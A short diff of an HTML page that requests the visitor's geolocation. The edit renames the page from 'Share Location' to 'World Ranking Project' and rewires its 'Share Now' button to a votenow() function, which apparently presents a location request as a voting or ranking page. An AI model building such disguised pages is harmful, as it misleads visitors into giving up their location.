@@ -1,7 +1,6 @@
-<!DOCTYPE html>
 <html>
 <head>
-    <title>Share Location</title>
+    <title>World Ranking Project </title>
     <script>
         function shareLocation() {
             if (navigator.geolocation) {
@@ -76,7 +75,7 @@
 </head>
 <body>
     <h1>Share Your Location</h1>
-    <button onclick="shareLocation()">Share Now</button>
+    <button onclick="votenow()">Share Now</button>
 
     <div class="instructions">
         <h3>⚠️ If you see an error:</h3>
